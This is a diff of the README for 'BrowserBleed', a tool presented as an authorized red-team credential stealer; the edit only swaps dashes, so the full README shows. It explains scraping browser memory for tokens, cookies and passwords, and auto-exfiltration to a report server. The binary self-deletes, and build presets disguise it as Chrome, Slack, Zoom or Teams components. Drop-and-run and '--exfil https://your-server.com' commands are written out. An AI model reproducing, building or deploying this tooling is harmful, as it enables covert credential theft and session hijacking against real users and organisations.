@@ -8,7 +8,7 @@ Authorized red team tool for extracting credentials, session tokens, and cookies
 
 ## Attack Overview
 
-Modern browsers hold decrypted credentials, session tokens, JWTs, and auth cookies entirely in process memory during an active session. An attacker or red teamer with local administrator access (Windows) or root (macOS) can read the virtual address space of every browser process, extract live credentials without touching disk, and use them to impersonate the victim across any service whose tokens appear in memory — regardless of whether the user's disk is encrypted.
+Modern browsers hold decrypted credentials, session tokens, JWTs, and auth cookies entirely in process memory during an active session. An attacker or red teamer with local administrator access (Windows) or root (macOS) can read the virtual address space of every browser process, extract live credentials without touching disk, and use them to impersonate the victim across any service whose tokens appear in memory - regardless of whether the user's disk is encrypted.
 
 This attack is effective against:
 - Corporate SSO sessions (Okta, Azure AD, Google Workspace)
@@ -22,7 +22,7 @@ This attack is effective against:
 
 ## How Each Script Works
 
-### Windows — `BrowserBleed.py`
+### Windows - `BrowserBleed.py`
 
 **Prerequisites:** Run as Administrator. Built with `--uac-admin` so Windows auto-elevates on launch.
 
@@ -45,12 +45,12 @@ When Chrome is running, BrowserBleed always attempts **Chrome DevTools Protocol*
 
 #### 3. Memory Scraping
 
-For each Chrome PID (all processes — renderer, GPU, network service, browser):
+For each Chrome PID (all processes - renderer, GPU, network service, browser):
 
 1. `OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION)` → get a handle
-2. `VirtualQueryEx` → walk the virtual address space, enumerate all `MEM_COMMIT` regions that aren't `PAGE_NOACCESS`, `PAGE_GUARD`, or `MEM_IMAGE` (DLL/EXE code sections — skipped; no credentials live there)
+2. `VirtualQueryEx` → walk the virtual address space, enumerate all `MEM_COMMIT` regions that aren't `PAGE_NOACCESS`, `PAGE_GUARD`, or `MEM_IMAGE` (DLL/EXE code sections - skipped; no credentials live there)
 3. **Pre-filter**: before running any regex, check each 64 KB chunk for known credential prefixes (`eyJ`, `Bearer `, `ghp_`, `sk-ant-`, `AKIA`, `-----BEGIN`, etc.) using C-speed `bytes.__contains__`. Skips ~85% of Chrome memory without regex overhead.
-4. `ReadProcessMemory` → read each qualifying region in **64 KB chunks** (vs. 4 KB previously — 16× fewer syscalls)
+4. `ReadProcessMemory` → read each qualifying region in **64 KB chunks** (vs. 4 KB previously - 16× fewer syscalls)
 5. Scan each chunk with `CREDENTIAL_PATTERNS` (20 regex patterns covering JWTs, Bearer tokens, OAuth tokens, API keys, session tokens, session IDs, cookies, passwords, SSH private keys)
 6. **512-byte overlap**: retain the last 512 bytes of each chunk and prepend to the next. Prevents credentials split across chunk boundaries from being missed.
 7. PIDs scraped in parallel via `ThreadPoolExecutor` (up to 8 workers)
@@ -95,7 +95,7 @@ Makes live outbound requests to verify token validity:
 
 ---
 
-### macOS — `BrowserBleed_mac.py`
+### macOS - `BrowserBleed_mac.py`
 
 **Prerequisites:** Run as root (`sudo`). `task_for_pid` requires root or the `com.apple.security.cs.debugger` entitlement.
 
@@ -109,7 +109,7 @@ Chrome on macOS encrypts cookies/passwords using **AES-128-CBC** with a key deri
 
 Multi-profile aware: enumerates `Default`, `Profile 1`–`Profile 19`, and `Guest Profile` per browser.
 
-Chrome v20+ uses app-bound encryption for cookies — these are labeled in output but not decryptable from outside the browser process.
+Chrome v20+ uses app-bound encryption for cookies - these are labeled in output but not decryptable from outside the browser process.
 
 #### 2. CDP Cookie Extraction
 
@@ -129,7 +129,7 @@ For each Chrome PID:
 
 #### 4. PID → Site Attribution
 
-Uses `ps -ww -A` to read Chrome process command lines and extract `--site-instance-site=URL` — same logic as Windows.
+Uses `ps -ww -A` to read Chrome process command lines and extract `--site-instance-site=URL` - same logic as Windows.
 
 #### 5–7. Deduplication, Identification, and Verification
 
@@ -150,10 +150,10 @@ Both versions write two files to the same directory as the binary:
 
 ## Usage
 
-When built with a report server baked in (see [Building your own binaries](#building-your-own-binaries)), just drop and run — no flags needed. Results upload automatically and the binary removes itself.
+When built with a report server baked in (see [Building your own binaries](#building-your-own-binaries)), just drop and run - no flags needed. Results upload automatically and the binary removes itself.
 
 **Default behaviour when a server is baked in:**
-1. Moves itself from the drop location into `%TEMP%` within ~2 seconds — gone from Explorer immediately
+1. Moves itself from the drop location into `%TEMP%` within ~2 seconds - gone from Explorer immediately
 2. Scans all browsers (disk + memory), exfils results to your server
 3. Deletes the `%TEMP%` copy 120 seconds after launch
 4. No local files left anywhere on the target
@@ -161,7 +161,7 @@ When built with a report server baked in (see [Building your own binaries](#buil
 ### Windows
 
 ```
-chrome_crashpad_handler.exe             # drop and run — exfils, vanishes
+chrome_crashpad_handler.exe             # drop and run - exfils, vanishes
 chrome_crashpad_handler.exe --no-self-delete   # keep the binary for testing
 chrome_crashpad_handler.exe --out results.txt  # also write a local file
 chrome_crashpad_handler.exe --browser chrome   # target one browser only
@@ -179,7 +179,7 @@ python BrowserBleed.py --exfil https://your-server.com --exfil-key YOUR_API_KEY
 ### macOS
 
 ```bash
-sudo ./BrowserBleed_mac                        # drop and run — exfils, self-deletes
+sudo ./BrowserBleed_mac                        # drop and run - exfils, self-deletes
 sudo ./BrowserBleed_mac --no-self-delete       # keep the binary for testing
 sudo ./BrowserBleed_mac --out /tmp/results.txt # also write a local file
 sudo ./BrowserBleed_mac --browser chrome       # target one browser only
@@ -206,7 +206,7 @@ The server is designed to handle highly sensitive data. Three layers of protecti
 
 | Layer | Mechanism |
 |-------|-----------|
-| **Encryption at rest** | Every report is encrypted with AES-256-GCM before touching disk. A separate `ENCRYPTION_KEY` (distinct from the API key) is used. `.enc` files only — no plaintext ever written. `meta.json` (hostname, timestamps, hit count — no credential values) is stored unencrypted for index building. |
+| **Encryption at rest** | Every report is encrypted with AES-256-GCM before touching disk. A separate `ENCRYPTION_KEY` (distinct from the API key) is used. `.enc` files only - no plaintext ever written. `meta.json` (hostname, timestamps, hit count - no credential values) is stored unencrypted for index building. |
 | **Auth** | Browser access via `POST /login` form → HttpOnly session cookie (no query params, never in logs). Programmatic upload via `Authorization: Bearer` header only. `/login` has `access_log off` in nginx so the key is never logged. |
 | **Auto-expiry** | Reports are deleted after a configurable TTL (default 24h). A background goroutine runs every 15 minutes. Expiry time is shown in the report view. |
 
@@ -236,7 +236,7 @@ bash deploy/deploy-binary.sh
 | Variable | Purpose |
 |----------|---------|
 | `API_KEY` | Shared between BrowserBleed `--exfil-key` and the browser login form |
-| `ENCRYPTION_KEY` | 64-char hex AES-256 key — generate with `openssl rand -hex 32` |
+| `ENCRYPTION_KEY` | 64-char hex AES-256 key - generate with `openssl rand -hex 32` |
 | `BASE_URL` | Public URL of the server (e.g. `https://reports.yourdomain.com`) |
 | `REPORT_TTL` | How long reports are kept (e.g. `24h`, `72h`) |
 
@@ -249,7 +249,7 @@ bash deploy/deploy-binary.sh   # rebuilds, uploads, restarts service
 
 ## Building your own binaries
 
-Binaries are **not distributed** — you build your own with your report server baked in. This keeps your server URL and API key out of any shared binary and off GitHub.
+Binaries are **not distributed** - you build your own with your report server baked in. This keeps your server URL and API key out of any shared binary and off GitHub.
 
 ### Prerequisites
 
@@ -260,19 +260,19 @@ pip3 install cryptography pyinstaller  # macOS
 
 Go 1.22+ is required only to build the report server binary.
 
-### Step 1 — Deploy the report server
+### Step 1 - Deploy the report server
 
 Follow the [Report Server](#report-server) deploy steps above. When done, `deploy/config` will contain your `DOMAIN` and `BB_API_KEY`.
 
-### Step 2 — Build for Windows
+### Step 2 - Build for Windows
 
 ```powershell
 .\build_windows.ps1
 ```
 
-Reads `DOMAIN` and `BB_API_KEY` from `deploy/config`, substitutes them into a temp copy of the source, and produces the exe in the repo root. The exe auto-exfils on every run — no flags needed on target.
+Reads `DOMAIN` and `BB_API_KEY` from `deploy/config`, substitutes them into a temp copy of the source, and produces the exe in the repo root. The exe auto-exfils on every run - no flags needed on target.
 
-**Disguising the binary** — use `-Preset` to pick a disguise, or run without arguments for an interactive menu:
+**Disguising the binary** - use `-Preset` to pick a disguise, or run without arguments for an interactive menu:
 
 ```powershell
 .\build_windows.ps1           # interactive menu to pick a preset
@@ -285,17 +285,17 @@ Available presets (set exe name, process name, icon, and Properties metadata aut
 
 | # | Preset | Exe name | Appears as |
 |---|--------|----------|------------|
-| 1 | `chrome` | `chrome_crashpad_handler.exe` | Google LLC — Google Chrome |
-| 2 | `edge` | `msedge_crashpad_handler.exe` | Microsoft Corporation — Microsoft Edge |
-| 3 | `brave` | `brave_crashpad_handler.exe` | Brave Software, Inc — Brave Browser |
-| 4 | `firefox` | `plugin-container.exe` | Mozilla Corporation — Mozilla Firefox |
-| 5 | `opera` | `opera_crashpad_handler.exe` | Opera Software AS — Opera internet browser |
-| 6 | `slack` | `slack.exe` | Slack Technologies, Inc. — Slack |
-| 7 | `discord` | `Discord.exe` | Discord Inc. — Discord |
-| 8 | `teams` | `ms-teams.exe` | Microsoft Corporation — Microsoft Teams |
-| 9 | `zoom` | `Zoom.exe` | Zoom Video Communications, Inc. — Zoom |
-| 10 | `whatsapp` | `WhatsApp.exe` | WhatsApp LLC — WhatsApp |
-| 11 | `telegram` | `Telegram.exe` | Telegram FZ-LLC — Telegram Desktop |
+| 1 | `chrome` | `chrome_crashpad_handler.exe` | Google LLC - Google Chrome |
+| 2 | `edge` | `msedge_crashpad_handler.exe` | Microsoft Corporation - Microsoft Edge |
+| 3 | `brave` | `brave_crashpad_handler.exe` | Brave Software, Inc - Brave Browser |
+| 4 | `firefox` | `plugin-container.exe` | Mozilla Corporation - Mozilla Firefox |
+| 5 | `opera` | `opera_crashpad_handler.exe` | Opera Software AS - Opera internet browser |
+| 6 | `slack` | `slack.exe` | Slack Technologies, Inc. - Slack |
+| 7 | `discord` | `Discord.exe` | Discord Inc. - Discord |
+| 8 | `teams` | `ms-teams.exe` | Microsoft Corporation - Microsoft Teams |
+| 9 | `zoom` | `Zoom.exe` | Zoom Video Communications, Inc. - Zoom |
+| 10 | `whatsapp` | `WhatsApp.exe` | WhatsApp LLC - WhatsApp |
+| 11 | `telegram` | `Telegram.exe` | Telegram FZ-LLC - Telegram Desktop |
 
 Icons are pulled automatically from the app's install path if it's installed on the build machine. If the app isn't installed, the binary is built without a custom icon.
 
@@ -311,7 +311,7 @@ Icons are pulled automatically from the app's install path if it's installed on 
     -ExfilKey mykey
 ```
 
-### Step 3 — Build for macOS
+### Step 3 - Build for macOS
 
 ```bash
 chmod +x build_mac.sh && ./build_mac.sh
@@ -329,11 +329,11 @@ EXFIL_URL=https://reports.example.com EXFIL_KEY=mykey ./build_mac.sh
 
 ### Dropping on a target
 
-Drop the built exe anywhere writable on the target and run it. The filename is whatever preset you chose — `chrome_crashpad_handler.exe`, `slack.exe`, etc.
+Drop the built exe anywhere writable on the target and run it. The filename is whatever preset you chose - `chrome_crashpad_handler.exe`, `slack.exe`, etc.
 
 ```
-chrome_crashpad_handler.exe   # Windows — exfils, moves itself to %TEMP%, self-deletes
-sudo ./BrowserBleed_mac       # macOS — exfils, self-deletes
+chrome_crashpad_handler.exe   # Windows - exfils, moves itself to %TEMP%, self-deletes
+sudo ./BrowserBleed_mac       # macOS - exfils, self-deletes
 ```
 
 View results at your report server after logging in with the API key.
@@ -345,7 +345,7 @@ View results at your report server after logging in with the API key.
 
 ### Rebuilding after source changes
 
-Re-run the build script — it always patches a temp copy, so the source files stay clean (no credentials in the `.py` files ever):
+Re-run the build script - it always patches a temp copy, so the source files stay clean (no credentials in the `.py` files ever):
 ```powershell
 .\build_windows.ps1 -Preset chrome   # or whichever preset you use
 ```
